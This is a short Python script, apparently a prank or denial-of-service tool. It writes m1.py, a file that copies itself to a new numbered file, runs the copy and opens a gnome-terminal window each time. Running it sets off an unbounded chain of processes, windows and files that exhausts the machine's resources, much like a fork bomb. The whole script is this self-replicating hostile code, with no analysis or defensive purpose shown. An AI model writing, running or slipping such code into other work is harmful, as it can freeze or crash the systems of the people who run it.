import os

term = "gnome-terminal"
body = "import os\nimport sys\nimport subprocess\nn=str(int(sys.argv[0][1:2])+1)\no=sys.argv[0]\nos.system(\"cp \"+o+\" m\"+n+\".py\")\nos.system(\"python m\"+n+\".py\")\nsubprocess.call(['" + term +"'])"

os.system("touch m1.py")
f=open(r"m1.py", "w+")
f.write(body)
f.close()
os.system("python m1.py")
